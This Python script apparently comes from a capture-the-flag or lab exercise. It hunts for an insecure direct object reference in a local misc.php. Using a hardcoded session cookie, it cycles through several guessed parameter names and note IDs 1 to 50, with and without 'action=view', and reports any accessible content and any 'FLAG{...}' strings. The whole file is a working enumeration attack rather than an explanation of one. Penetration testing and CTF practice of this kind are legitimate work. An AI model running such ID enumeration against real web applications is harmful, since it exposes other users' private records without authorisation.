import urllib.request
import urllib.parse
import time

def test_misc_php():
    session_cookie = 'PHPSESSID=17f3f417d868573c3079e3f6ee928eb6'
    base_url = 'http://127.0.0.1/misc.php'
    
    print('[*] Starting IDOR test for misc.php using urllib')
    print(f'[*] Session cookie: {session_cookie}')
    print('-'*60)
    
    # Parameter names to test
    param_names = ['note_id', 'noteid', 'id', 'note', 'nid']
    
    found_responses = []
    
    for param in param_names:
        print(f'\n[+] Testing parameter: {param}')
        
        for note_id in range(1, 51):
            # Test without action parameter
            try:
                url_params = urllib.parse.urlencode({param: note_id})
                full_url = f'{base_url}?{url_params}'
                
                req = urllib.request.Request(full_url)
                req.add_header('Cookie', session_cookie)
                
                with urllib.request.urlopen(req, timeout=30) as response:
                    content = response.read().decode('utf-8')
                    if content and len(content.strip()) > 10:
                        status = response.getcode()
                        preview = content.replace('\n', ' ')[:100]
                        print(f'[!] Content found: {param}={note_id}')
                        print(f'   Status: {status}, Length: {len(content)}')
                        print(f'   Preview: {preview}')
                        
                        # Check for FLAG
                        if 'FLAG{' in content:
                            flag_start = content.find('FLAG{')
                            flag_end = content.find('}', flag_start) + 1
                            flag = content[flag_start:flag_end]
                            print(f'   [CRITICAL] FLAG: {flag}')
                        
                        found_responses.append({
                            'param': param,
                            'note_id': note_id,
                            'action': None,
                            'status': status,
                            'length': len(content),
                            'response_preview': content[:200]
                        })
                        
            except Exception as e:
                pass
            
            # Test with action=view parameter
            try:
                url_params = urllib.parse.urlencode({param: note_id, 'action': 'view'})
                full_url = f'{base_url}?{url_params}'
                
                req = urllib.request.Request(full_url)
                req.add_header('Cookie', session_cookie)
                
                with urllib.request.urlopen(req, timeout=30) as response:
                    content = response.read().decode('utf-8')
                    if content and len(content.strip()) > 10:
                        status = response.getcode()
                        preview = content.replace('\n', ' ')[:100]
                        print(f'[!] Content found: {param}={note_id} (action=view)')
                        print(f'   Status: {status}, Length: {len(content)}')
                        print(f'   Preview: {preview}')
                        
                        # Check for FLAG
                        if 'FLAG{' in content:
                            flag_start = content.find('FLAG{')
                            flag_end = content.find('}', flag_start) + 1
                            flag = content[flag_start:flag_end]
                            print(f'   [CRITICAL] FLAG: {flag}')
                        
                        found_responses.append({
                            'param': param,
                            'note_id': note_id,
                            'action': 'view',
                            'status': status,
                            'length': len(content),
                            'response_preview': content[:200]
                        })
                        
            except Exception as e:
                pass
            
            time.sleep(0.1)
    
    # Summary
    print('\n' + '='*60)
    print(f'[*] IDOR test completed')
    print(f'[+] Found {len(found_responses)} accessible notes')
    
    if found_responses:
        print('\n[!] POTENTIAL IDOR VULNERABILITY DETECTED!')
        print('Accessible notes:')
        for item in found_responses:
            action = f'+{item.get("action", "none")}' if item.get('action') else ''
            print(f'  - {item["param"]}={item["note_id"]} {action}: Status={item["status"]}, Len={item["length"]}')
    else:
        print('[-] No accessible notes found')
    
    return found_responses

if __name__ == '__main__':
    test_misc_php()

